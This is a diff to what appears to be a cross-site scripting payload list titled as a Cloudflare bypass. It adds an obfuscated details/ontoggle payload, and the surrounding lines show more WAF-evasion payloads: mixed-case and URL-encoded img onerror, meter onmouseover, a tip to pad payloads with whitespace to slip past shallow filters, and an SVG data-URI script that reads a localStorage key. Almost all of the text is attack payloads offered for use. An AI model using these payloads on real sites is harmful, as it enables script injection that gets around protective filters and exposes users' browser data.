@@ -37,6 +37,10 @@ Cloudflare Bypass, checked on 11/10/2025 (U.S. date):
 <Img Src=OnXSS OnErroR=confirm(111)>
 %3CImg%20Src%3DOnXSS%20OnErroR%3Dconfirm%28111%29%3E
 
+"><deTAIls/+/oNTogGLE%0A=%0Aconfirm()%0Dx>
+
+
+
 *test start of payload with 10240 characters of whitespace to bypass shallow filters*
 
 <img src="" ><meter onmouseover=confirm(document.domain)><progress>
@@ -73,6 +77,7 @@ iframe srcdoc (may bypass some filters):
 
 SVG with script (data URI):
 <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3Eparent.document.body.appendChild(parent.document.createTextNode(localStorage.getItem('MY_KEY')))%3C/script%3E%3C/svg%3E">
+
 
 
 
